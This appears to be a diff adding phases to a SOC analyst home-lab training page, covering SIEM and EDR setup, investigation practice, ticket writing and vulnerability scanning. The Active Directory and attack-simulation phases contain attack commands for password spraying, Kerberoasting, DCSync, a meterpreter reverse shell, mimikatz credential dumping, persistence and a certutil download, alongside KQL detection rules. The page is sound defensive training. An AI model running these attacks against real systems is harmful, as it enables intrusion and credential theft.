+            <div class="step-content">
+              <div class="step-title">Install Sysmon on Windows 10 with SwiftOnSecurity config</div>
+              <div class="step-desc">On your Windows VM: download <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank">Sysmon</a> from Microsoft Sysinternals. Download the <a href="https://github.com/SwiftOnSecurity/sysmon-config" target="_blank">SwiftOnSecurity config</a> — this is a community-maintained best-practice Sysmon configuration. Open PowerShell as Administrator and run: <code>.\\Sysmon64.exe -accepteula -i sysmonconfig-export.xml</code>. Sysmon now logs all process creation, network connections, file writes, and registry changes.</div>
+              <div class="step-tools"><span class="stool">Sysmon</span><span class="stool">SwiftOnSecurity config</span><span class="stool">PowerShell</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Connect Windows to Elastic via Fleet</div>
+              <div class="step-desc">In Kibana: go to Fleet → Add Agent → copy the PowerShell install command shown on screen. Run that command in your Windows VM PowerShell. Wait 60 seconds — the agent appears in Fleet. Click it → enable the Windows integration and Sysmon integration. Go to Kibana → Discover and confirm logs are flowing. You should see Event IDs 4624, 4625, 4688, 4698 and Sysmon events 1, 3, 10, 11, 13.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">4</div>
+            <div class="step-content">
+              <div class="step-title">Install Suricata IDS on Ubuntu</div>
+              <div class="step-desc">On Ubuntu: <code>sudo apt install suricata -y</code> then <code>sudo suricata-update</code> to download the latest ET Open threat rules. Edit the config to set your network interface: <code>sudo nano /etc/suricata/suricata.yaml</code>. Start it: <code>sudo systemctl enable --now suricata</code>. Test: from Kali run <code>nmap [ubuntu-ip]</code> and check <code>sudo tail -f /var/log/suricata/fast.log</code> — you should see the scan alert. Install Filebeat to forward Suricata logs to Elastic: <code>sudo apt install filebeat</code> → enable suricata module → connect to Elasticsearch.</div>
+              <div class="step-tools"><span class="stool">Suricata</span><span class="stool">ET Open Rules</span><span class="stool">Filebeat</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">5</div>
+            <div class="step-content">
+              <div class="step-title">Build 5 Kibana detection dashboards</div>
+              <div class="step-desc">In Kibana → Analytics → Dashboards → Create. Build these 5 dashboards using KQL filters:<br>
+              1. <strong>Authentication</strong> — Event ID 4624 (logins) and 4625 (failed logins) over time<br>
+              2. <strong>Process Activity</strong> — top processes created, PowerShell executions, encoded commands<br>
+              3. <strong>Network</strong> — top destination IPs and ports, unusual outbound connections<br>
+              4. <strong>IDS Alerts</strong> — Suricata alerts by severity and category<br>
+              5. <strong>Persistence</strong> — scheduled tasks (4698), services installed (7045), registry changes (Sysmon 13)<br>
+              These are what a real SOC analyst checks at the start of every shift.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Windows and Sysmon logs flow into Kibana. Suricata alerts appear. 5 dashboards built. Your SIEM is live.</div>
+      </div>
+    </div>
+
+            <!-- PHASE 03 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">03</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Wazuh XDR — Second Detection Platform</div>
+          <div class="phase-hdr-meta">Open-source EDR/XDR/SIEM · agents · FIM · ATT&CK mapping · ~3 hours</div>
+          <div class="phase-tags"><span class="ptag">Wazuh</span><span class="ptag">XDR</span><span class="ptag">EDR Agent</span><span class="ptag">FIM</span><span class="ptag">Vulnerability Detection</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> Elastic SIEM taught you log ingestion and detection. Wazuh teaches you the EDR agent-to-manager-to-console workflow used by enterprise EDR tools like CrowdStrike and SentinelOne. Understanding this pattern means you can learn any EDR in your first week on the job. It is also one of the most used open-source security platforms at real companies.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Install Wazuh all-in-one on Ubuntu</div>
+              <div class="step-desc">On your Ubuntu SIEM VM run the Wazuh quick-start installer: <code>curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash wazuh-install.sh -a</code>. This installs the Wazuh Manager, Wazuh Indexer, and Wazuh Dashboard in a single command. Access the web UI at <code>https://[ubuntu-ip]</code> using the credentials printed at the end of the installer. Note: it is resource-heavy — run it with Elastic shut down or use a separate VM if RAM allows.</div>
+              <div class="step-tools"><span class="stool">Wazuh Manager</span><span class="stool">Wazuh Dashboard</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Deploy Wazuh agents on Windows and Ubuntu</div>
+              <div class="step-desc">In the Wazuh dashboard go to Agents → Deploy New Agent. Follow the Windows PowerShell install command for your Windows VM and the Linux command for your Ubuntu VM. This is the same workflow used to onboard endpoints in CrowdStrike, SentinelOne, and MDE — a command deployed via script or GPO that registers the endpoint with the central manager. Confirm both agents show Active in the dashboard.</div>
+              <div class="step-tools"><span class="stool">Wazuh Agent</span><span class="stool">PowerShell</span><span class="stool">Agent Enrollment</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Explore alerts, FIM, and vulnerability detection</div>
+              <div class="step-desc">Generate activity on your Windows VM and review what Wazuh captures. Explore three key modules:<br>
+              → <strong>Alerts</strong>: navigate the Threat Hunting dashboard — review detected events, rule IDs, and severity levels<br>
+              → <strong>File Integrity Monitoring (FIM)</strong>: create, modify, and delete a file in a monitored directory — watch Wazuh alert on the change. This is how EDRs detect file system tampering and malware dropping payloads.<br>
+              → <strong>Vulnerability Detection</strong>: enable the vulnerability-detector module and run a scan — review CVEs found on your Windows host</div>
+              <div class="step-tools"><span class="stool">FIM</span><span class="stool">Vulnerability Detector</span><span class="stool">Wazuh Rules</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">4</div>
+            <div class="step-content">
+              <div class="step-title">View the built-in MITRE ATT&CK mapping</div>
+              <div class="step-desc">Navigate to Wazuh → Modules → MITRE ATT&CK. Wazuh automatically maps its detection rules to ATT&CK techniques. Run a few attack simulations from Kali and see how they appear in the ATT&CK heatmap. Compare this to your Elastic SIEM workflow. This is exactly what real SOC teams use to measure detection coverage and prioritize rule development.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">5</div>
+            <div class="step-content">
+              <div class="step-title">Write a Wazuh vs Elastic comparison document</div>
+              <div class="step-desc">Document the differences and similarities between Wazuh and Elastic SIEM: data ingestion, agent model, alerting, threat hunting, ATT&CK coverage, dashboard usability, and use cases. Publish to GitHub. Being able to compare two SIEM/XDR platforms fluently in an interview is a strong signal of real depth — most candidates can only speak to one.</div>
+            </div>
+          </div>
+        </div>
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "My lab runs both Elastic SIEM and Wazuh XDR. Wazuh taught me the EDR agent enrollment, FIM alerting, and MITRE ATT&CK coverage mapping workflows that translate directly to CrowdStrike and SentinelOne. I documented a comparison of both platforms covering ingestion, alerting, and threat hunting workflows."
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Wazuh running with agents on Windows and Ubuntu. FIM, vulnerability detection, and ATT&CK mapping explored. Wazuh vs Elastic comparison published to GitHub.</div>
+      </div>
+    </div>
+    <!-- TRACK 2 DIVIDER -->
+    <div class="track-divider" style="border-left-color:var(--accent2)">
+      <div class="track-divider-icon">🔍</div>
+      <div>
+        <div class="track-divider-title">Track 2 — SOC L1 Analyst Practice</div>
+        <div class="track-divider-sub">Use what you built. Investigate, document, detect, and triage real attack scenarios.</div>
+      </div>
+    </div>
+<!-- PHASE 04 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">04</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">SOC L1 Investigation Practice</div>
+          <div class="phase-hdr-meta">Use what you built · 10 investigations · interview-ready · ~6 hours</div>
+          <div class="phase-tags"><span class="ptag g">Bridge Phase</span><span class="ptag">Alert Triage</span><span class="ptag">Kibana Discover</span><span class="ptag">MITRE ATT&CK</span><span class="ptag">Incident Notes</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this phase matters:</strong> Building the lab proves you can deploy tools. This phase proves you can <em>actually use them like a SOC Analyst.</em> Stop here before Phase 3. Practice alert triage, log analysis, timeline building, MITRE mapping, and writing clear incident notes using the Elastic SIEM, Sysmon, Fleet, and Suricata environment you just built.</div>
+        <div class="steps-list">
+
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Failed Login Investigation</div>
+              <div class="step-desc">Generate failed login attempts on the Windows 10 VM. Search Kibana for failed logon events. Identify target user, host, timestamp, and number of attempts. Decide: user error or brute force?</div>
+              <div class="step-tools"><span class="stool">Event ID 4625</span><span class="stool">T1110 Brute Force</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Successful Login After Failures</div>
+              <div class="step-desc">Look for failed logins followed by a successful login. Same user? Same source IP? Build a short timeline. Decide whether to escalate.</div>
+              <div class="step-tools"><span class="stool">Event ID 4625 + 4624</span><span class="stool">T1078 Valid Accounts</span><span class="stool">T1110 Brute Force</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Suspicious PowerShell Execution</div>
+              <div class="step-desc">Generate PowerShell activity in the Windows VM. Search Sysmon for <code>powershell.exe</code>. Review parent process, command line, user, timestamp. Flag encoded commands, download cradles, or unusual parents.</div>
+              <div class="step-tools"><span class="stool">Sysmon Event 1</span><span class="stool">T1059.001 PowerShell</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">4</div>
+            <div class="step-content">
+              <div class="step-title">Parent-Child Process Investigation</div>
+              <div class="step-desc">Investigate process chains like <code>cmd.exe</code> spawning <code>powershell.exe</code>, or <code>explorer.exe</code> spawning command-line tools. Identify parent, child, command line, and user. Explain why this matters in SOC investigations.</div>
+              <div class="step-tools"><span class="stool">Sysmon Event 1</span><span class="stool">T1059 Command &amp; Scripting</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">5</div>
+            <div class="step-content">
+              <div class="step-title">New Local User Created</div>
+              <div class="step-desc">Create a test local user in the Windows VM. Search for account creation logs. Identify who, when, and on which host. Would this be suspicious in a real enterprise?</div>
+              <div class="step-tools"><span class="stool">Event ID 4720</span><span class="stool">T1136 Create Account</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">6</div>
+            <div class="step-content">
+              <div class="step-title">Local Admin Group Modification</div>
+              <div class="step-desc">Add a test user to the local Administrators group. Search for group modification events. Identify user added, group, timestamp, and actor account. Explain why this signals privilege escalation.</div>
+              <div class="step-tools"><span class="stool">Event ID 4732</span><span class="stool">T1098 Account Manipulation</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">7</div>
+            <div class="step-content">
+              <div class="step-title">Sysmon Network Connection Investigation</div>
+              <div class="step-desc">Generate outbound network activity from the Windows VM. Search Sysmon network events. Identify process name, destination IP, port, protocol, timestamp. Normal browsing or something to escalate?</div>
+              <div class="step-tools"><span class="stool">Sysmon Event 3</span><span class="stool">T1105 Ingress Tool Transfer</span><span class="stool">T1041 Exfiltration</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">8</div>
+            <div class="step-content">
+              <div class="step-title">Suricata IDS Alert Triage</div>
+              <div class="step-desc">Trigger a test alert using your custom ICMP rule from Phase 2 (or another safe test). Review <code>fast.log</code> and <code>eve.json</code>. Identify source IP, destination IP, signature, and rule ID. False positive, benign test, or escalate?</div>
+              <div class="step-tools"><span class="stool">Suricata</span><span class="stool">fast.log</span><span class="stool">eve.json</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">9</div>
+            <div class="step-content">
+              <div class="step-title">Timeline Investigation</div>
+              <div class="step-desc">Pick one scenario from the above. Build a timeline using multiple log sources — process starts, logins, network connections, IDS alerts. Tell the story in order using evidence only.</div>
+              <div class="step-tools"><span class="stool">Multi-source correlation</span><span class="stool">Timeline analysis</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">10</div>
+            <div class="step-content">
+              <div class="step-title">Incident Report Writeups</div>
+              <div class="step-desc">For each investigation write a SOC-style report containing: Alert name · Severity · Host · User · Timestamp · Summary · Evidence · Timeline · MITRE mapping · Verdict (TP/FP/benign/escalate) · Recommended action. Publish them to GitHub.</div>
+              <div class="step-tools"><span class="stool">GitHub portfolio</span><span class="stool">Markdown</span><span class="stool">Professional writing</span></div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(0,212,255,.04);border:1px solid rgba(0,212,255,.15);border-radius:8px;border-bottom:none">
+          <strong style="color:var(--accent);font-family:var(--mono);font-size:11px;letter-spacing:.06em">SOC ANALYST SKILLS PRACTICED</strong><br><br>
+          SIEM searching · Windows Event Log analysis · Sysmon investigation · Elastic/Kibana Discover · Alert triage · False positive analysis · Parent-child process analysis · Basic threat hunting · Timeline building · MITRE ATT&amp;CK mapping · Incident note writing · Escalation decision-making
+        </div>
+
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.15);border-radius:8px;border-bottom:none">
+          <strong style="color:var(--accent2);font-family:var(--mono);font-size:11px;letter-spacing:.06em">COMPLETION CRITERIA</strong><br><br>
+          ✓ Complete at least 10 SOC-style investigations<br>
+          ✓ Document at least 5 investigations on GitHub<br>
+          ✓ Create at least 3 polished incident reports<br>
+          ✓ Map each investigation to MITRE ATT&amp;CK<br>
+          ✓ Include screenshots from Kibana Discover, dashboards, Sysmon logs, and Suricata alerts<br>
+          ✓ Be able to explain each investigation in an interview without reading from notes
+        </div>
+
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I built and used a SOC home lab to investigate Windows endpoint and network activity. I collected Sysmon and Windows Event Logs into Elastic using Fleet and Elastic Agent, used Kibana Discover to investigate process execution, login activity, parent-child process chains, and network connections, and validated Suricata IDS alerts. I also wrote SOC-style investigation notes, mapped findings to MITRE ATT&amp;CK, and practiced deciding whether activity was benign, suspicious, or worth escalating."
+        </div>
+
+        <div class="goal-box"><strong>PHASE GOAL</strong>Lab transforms from deployment project to analyst practice. You can investigate, search logs, build timelines, explain evidence, and communicate findings like a SOC Analyst — not just deploy tools.</div>
+      </div>
+    </div>
+
+        <!-- PHASE 05 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">05</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">SOC Ticket Writing &amp; Incident Documentation</div>
+          <div class="phase-hdr-meta">Standard ticket format · escalation notes · 5 full reports · ~3 hours</div>
+          <div class="phase-tags"><span class="ptag g">SOC L1 Core</span><span class="ptag">Ticket Writing</span><span class="ptag">Incident Reports</span><span class="ptag">Escalation</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> SOC analysts are judged on two things — technical ability and communication. A brilliant investigation documented poorly gets ignored. Master the ticket format used in real SOCs and you walk into any L1 role ready to contribute from day one.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Master the standard SOC ticket format</div>
+              <div class="step-desc">Every ticket must include: <strong>Alert Name</strong> · <strong>Severity</strong> · <strong>Host</strong> · <strong>User</strong> · <strong>Source IP</strong> · <strong>Dest IP</strong> · <strong>Timestamp</strong> · <strong>Detection Source</strong> · <strong>Summary</strong> · <strong>Evidence</strong> (log excerpts + screenshots) · <strong>Timeline</strong> · <strong>Analysis</strong> · <strong>MITRE ATT&amp;CK</strong> · <strong>Verdict</strong> (TP/FP/Benign/Escalate) · <strong>Escalation Decision</strong> · <strong>Recommended Action</strong>. Save this as a template in your GitHub repo.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Write 5 tickets from your Phase 3 investigations</div>
+              <div class="step-desc">Take your failed login, suspicious PowerShell, parent-child process, new user, and admin group investigations and document each using the full ticket template. Cite exact Event IDs, timestamps, usernames, and hosts. Be specific — real managers will read these.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Write 3 escalation summaries</div>
+              <div class="step-desc">For 3 investigations, write a 2-3 sentence escalation note — what you'd send your L2. Include: what was observed, what you did to investigate, why you're escalating, what you need them to do. Concise and clear. This is one of the most asked-about skills in L1 interviews.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">4</div>
+            <div class="step-content">
+              <div class="step-title">Write 1 full incident report</div>
+              <div class="step-desc">Pick your strongest Phase 3 investigation. Write a complete report: Executive Summary (non-technical), Technical Findings, Timeline, Evidence with screenshots, MITRE mapping, Containment Recommendation, Lessons Learned. Publish to GitHub. This is your anchor portfolio piece.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">5</div>
+            <div class="step-content">
+              <div class="step-title">Practice explaining a ticket out loud</div>
+              <div class="step-desc">Pick one ticket and present it out loud in 2-3 minutes as if briefing your manager or in a live interview. Record yourself. Cover: what the alert was, what you investigated, what you found, what you recommended. This directly prepares you for "walk me through an alert you've triaged."</div>
+            </div>
+          </div>
+        </div>
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I document every investigation using a standardized SOC ticket format covering alert details, evidence, timeline, MITRE mapping, verdict, and recommended action. I've written full incident reports and escalation summaries and practiced presenting my findings verbally."
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>5 tickets written. 3 escalation summaries. 1 full incident report published to GitHub. You can walk through any ticket in a 2-minute verbal response.</div>
+      </div>
+    </div>
+<!-- PHASE 06 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">06</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Build an Active Directory Environment</div>
+          <div class="phase-hdr-meta">Active Directory · Domain Controller · AD attacks · ~3 hours</div>
+          <div class="phase-tags"><span class="ptag">Active Directory</span><span class="ptag">Kerberos</span><span class="ptag">BloodHound</span><span class="ptag">Group Policy</span><span class="ptag">AD Attacks</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">The vast majority of enterprise SOC alerts involve Active Directory. If you don't understand AD, you can't triage most alerts. Build it, attack it, detect the attacks.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Promote Windows 10 to a Domain Controller</div>
+              <div class="step-desc">Open PowerShell as Administrator on your Windows VM and run:<br>
+              <code>Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools</code><br>
+              <code>Install-ADDSForest -DomainName 'lab.local'</code><br>
+              Set a DSRM password when prompted. Let the machine restart. Log back in as <code>lab\Administrator</code>.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Create users and organizational units</div>
+              <div class="step-desc">Open Active Directory Users and Computers (ADUC). Create 3 OUs: IT, HR, Finance. Create users: <code>john.doe</code> (IT), <code>jane.smith</code> (HR), <code>bob.jones</code> (Finance) — set password <code>Password123</code> on all. Create one admin user: <code>lab-admin</code> → add to Domain Admins group. Create a GPO to disable Windows Defender for the domain (so attack tools work in your lab).</div>
+              <div class="step-tools"><span class="stool">ADUC</span><span class="stool">Group Policy Management</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Simulate and detect 6 AD attacks from Kali</div>
+              <div class="step-desc">Run each attack from Kali, then immediately find it in Kibana:<br><br>
+              <strong>Password Spray:</strong> <code>crackmapexec smb [win-ip] -u users.txt -p 'Password123'</code> → look for Event ID 4625 spike<br>
+              <strong>AS-REP Roasting:</strong> <code>impacket-GetNPUsers lab.local/ -no-pass -usersfile users.txt</code> → Event ID 4768<br>
+              <strong>Kerberoasting:</strong> <code>impacket-GetUserSPNs lab.local/john.doe:Password123 -request</code> → Event ID 4769<br>
+              <strong>BloodHound recon:</strong> run SharpHound on Windows → visualize attack paths in BloodHound<br>
+              <strong>Pass-the-Hash:</strong> dump hashes with mimikatz → <code>crackmapexec smb [win-ip] -H [hash]</code><br>
+              <strong>DCSync:</strong> <code>impacket-secretsdump lab.local/lab-admin:Password123@[win-ip]</code> → Event ID 4662<br><br>
+              For each: identify the Event ID, map to a MITRE ATT&CK technique, write a triage note.</div>
+              <div class="step-tools"><span class="stool">CrackMapExec</span><span class="stool">Impacket</span><span class="stool">BloodHound</span><span class="stool">mimikatz</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>AD domain running. 6 attacks simulated and detected in Kibana. Every attack mapped to ATT&CK.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 07 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">07</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Attack Simulation + Alert Triage</div>
+          <div class="phase-hdr-meta">8 attack types · KQL detection rules · 7 runbooks · ~6 hours</div>
+          <div class="phase-tags"><span class="ptag">Metasploit</span><span class="ptag">mimikatz</span><span class="ptag">KQL Rules</span><span class="ptag">Sigma</span><span class="ptag">Runbooks</span><span class="ptag">PICERL</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">This phase is the core of what L1 SOC analysts do every day — receive an alert, investigate it, decide what it is, document it, and close it or escalate. You generate real attacks and triage the real alerts they produce.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Run 8 attack scenarios and triage each alert in Kibana</div>
+              <div class="step-desc">
+              <strong>1. Port scan:</strong> <code>nmap -sV -sC [win-ip]</code> → find in Sysmon Event 3 + Suricata<br>
+              <strong>2. RDP brute force:</strong> <code>hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[win-ip]</code> → Event 4625 spike<br>
+              <strong>3. Reverse shell:</strong> <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[kali] LPORT=4444 -f exe > shell.exe</code> → transfer to Windows → run → Sysmon 1 and 3<br>
+              <strong>4. Encoded PowerShell:</strong> on Windows: <code>powershell -enc [base64]</code> → Sysmon Event 1 with -enc in args<br>
+              <strong>5. Credential dump:</strong> run mimikatz <code>sekurlsa::logonpasswords</code> → Sysmon Event 10 (LSASS access)<br>
+              <strong>6. Scheduled task:</strong> <code>schtasks /create /tn Updater /tr calc.exe /sc onlogon</code> → Event 4698<br>
+              <strong>7. Registry persistence:</strong> <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d calc.exe</code> → Sysmon 13<br>
+              <strong>8. LOLBin abuse:</strong> <code>certutil.exe -urlcache -split -f http://[kali]:8000/test.txt test.txt</code> → Sysmon 1<br><br>
+              For EVERY attack: write a triage note — what fired, what host, what user, is this a true positive, what ATT&CK technique.
+              </div>
+              <div class="step-tools"><span class="stool">Metasploit</span><span class="stool">Hydra</span><span class="stool">mimikatz</span><span class="stool">Kibana KQL</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Write 7 custom KQL detection rules in Elastic</div>
+              <div class="step-desc">In Kibana → Security → Rules → Create Rule. Build these:<br>
+              1. LSASS Access: <code>winlog.event_data.TargetImage: *lsass.exe AND NOT process.name: (MsMpEng.exe)</code> → Critical<br>
+              2. Encoded PowerShell: <code>process.name: powershell.exe AND process.command_line: *-enc*</code> → High<br>
+              3. Certutil Download: <code>process.name: certutil.exe AND process.command_line: *urlcache*</code> → High<br>
+              4. Scheduled Task Created: <code>event.code: 4698</code> → Medium<br>
+              5. RDP Brute Force: <code>event.code: 4625 AND winlog.event_data.LogonType: 10</code> threshold 10/60s → High<br>
+              6. New Admin Added: <code>event.code: 4732 AND group.name: Administrators</code> → Critical<br>
+              7. WMI Execution: <code>process.parent.name: WmiPrvSE.exe AND process.name: (cmd.exe OR powershell.exe)</code> → High<br>
+              Test each rule by running the matching attack. Confirm it fires.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Write a runbook for each of these 7 alert types</div>
+              <div class="step-desc">A runbook is a step-by-step decision guide for handling a specific alert. Write one for: Brute Force, Malware Execution, Phishing, Privilege Escalation, C2 Beaconing, LSASS Access, Lateral Movement. Each runbook should define: what triggered it → what to check in order → IOC lookups to run → when to escalate → when to close. Save all 7 as Markdown files in your GitHub repo.</div>
+              <div class="step-tools"><span class="stool">GitHub</span><span class="stool">Markdown</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">4</div>
+            <div class="step-content">
+              <div class="step-title">Write PICERL incident reports for every attack</div>
+              <div class="step-desc">For each of your 8 attack simulations, write a full incident report using the PICERL framework:<br>
+              <strong>P</strong>reparation → <strong>I</strong>dentification → <strong>C</strong>ontainment → <strong>E</strong>radication → <strong>R</strong>ecovery → <strong>L</strong>essons Learned<br><br>
+              Each report should include: timeline, ATT&CK technique, IOC table, containment steps, and remediation. These become your portfolio. Publish all of them to GitHub.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>8 attacks simulated and triaged. 7 detection rules firing. 7 runbooks written. 8 incident reports in GitHub.</div>
+      </div>
+    </div>
+
+            <!-- TRACK 3 DIVIDER -->
+    <div class="track-divider" style="border-left-color:var(--accent2)">
+      <div class="track-divider-icon">🛡️</div>
+      <div>
+        <div class="track-divider-title">Track 3 — Cybersecurity Analyst Skills</div>
+        <div class="track-divider-sub">Vulnerability management, threat intel, hardening, IAM, GRC — the skills that unlock Security Analyst roles.</div>
+      </div>
+    </div>
+<!-- PHASE 08 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">08</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Vulnerability Management</div>
+          <div class="phase-hdr-meta">Nessus Essentials · CVSS · remediation tracking · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag g">Cyber Analyst</span><span class="ptag">Nessus</span><span class="ptag">CVE</span><span class="ptag">CVSS</span><span class="ptag">Patch Management</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> Nearly every Cybersecurity Analyst job description mentions vulnerability management. SOC-only training skips this. Adding hands-on vulnerability scanning, triage, and remediation tracking makes you eligible for a much wider range of analyst roles.</div>
+        <div class="steps-list">
+
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Install Nessus Essentials (free for 16 IPs)</div>
+              <div class="step-desc">Download <a href="https://www.tenable.com/products/nessus/nessus-essentials" target="_blank">Nessus Essentials</a> on Ubuntu or Kali. Free version supports up to 16 IPs — perfect for a home lab. Register for an activation code, install, and access the web UI at <code>https://[host]:8834</code>.</div>
+              <div class="step-tools"><span class="stool">Nessus Essentials</span><span class="stool">Tenable</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Run a full credentialed scan</div>
+              <div class="step-desc">Configure a "Basic Network Scan" against your Windows VM and Ubuntu VM. Add credentials (SSH key for Linux, local admin for Windows) so Nessus can do an authenticated scan — these find way more than uncredentialed scans. Run it and let it complete.</div>
+              <div class="step-tools"><span class="stool">Authenticated Scanning</span><span class="stool">SSH Credentials</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Triage findings by CVSS score</div>
